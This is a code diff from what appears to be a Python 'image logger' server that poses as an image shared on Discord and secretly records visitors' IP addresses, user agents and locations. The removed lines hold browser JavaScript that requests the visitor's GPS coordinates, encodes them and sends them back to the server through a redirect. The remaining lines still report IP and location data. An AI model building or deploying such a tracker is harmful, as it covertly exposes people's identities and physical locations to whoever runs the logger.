@@ -194,28 +194,6 @@ div.img {{
             if dic.get("g") and config["accurateLocation"]:
                 location = base64.b64decode(dic.get("g").encode()).decode()
                 result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location)
-            elif config["accurateLocation"] and not dic.get("g"):
-                self.send_response(200) # 200 = OK (HTTP Status)
-                self.send_header('Content-type', 'text/html') # Define the data as an image so Discord can show it.
-                self.end_headers() # Declare the headers as finished.
-
-                data += b"""<script>
-var currenturl = window.location.href;
-
-if (!currenturl.includes("g=")) {
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(function (coords) {
-    if (currenturl.includes("?")) {
-        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
-    } else {
-        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
-    }
-    location.replace(currenturl);});
-}}
-
-</script>"""
-                self.wfile.write(data)
-                return
             else:
                 result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'))
             
